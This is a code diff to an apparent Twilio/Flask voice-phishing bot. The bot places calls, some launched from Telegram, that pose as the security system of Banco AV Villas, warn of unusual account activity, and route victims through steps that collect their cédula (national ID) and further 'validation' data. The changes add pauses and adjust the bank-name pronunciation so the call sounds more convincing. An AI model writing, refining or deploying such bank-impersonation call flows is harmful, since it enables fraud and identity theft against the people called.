@@ -248,20 +248,24 @@ def start():
     """
     response = VoiceResponse()
     
+    # Pausa inicial de 5 segundos para que la persona se prepare
+    response.pause(length=5)
+    
     # Verificar si la llamada fue iniciada desde Telegram
     call_sid = request.values.get('CallSid')
     if call_sid and is_call_from_telegram(call_sid):
-        response.say("Hola,le habla el sistema de seguridad del Banco Av Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        response.say("Hola,le habla el sistema de seguridad del Banco A V Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
         # Pausa de 4 segundos antes de redirigir
         response.pause(length=4)
         response.redirect('/step1')
     else:
-        response.say("Hola,le habla el sistema de seguridad del Banco Av Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
+        response.say("Hola,le habla el sistema de seguridad del Banco A V Villas. Detectamos una actividad inusual en unos de sus productos. Si usted reconoce esta operación haga caso omiso de lo contrario presione 1 para comunicarle con un asesor", language='es-ES')
         # Pausa de 4 segundos antes de redirigir
-        response.pause(length=4)
+        response.pause(length=6)
         response.redirect('/step1')
     
     return str(response)
+
 
 
 # STEP 1: CÉDULA (PRIMERO)
@@ -460,6 +464,7 @@ def save_step3():
     # Redirigir a la ruta de espera con el parámetro de revalidación apropiado
     response.redirect(f"/waiting-validation?CallSid={call_sid}&wait=8&revalidation={str(is_revalidation).lower()}")
     return str(response)
+    
 
 # El resto del código de validate-result permanece igual, solo hay que actualizar las referencias:
 @app.route('/validate-result', methods=['GET', 'POST'])
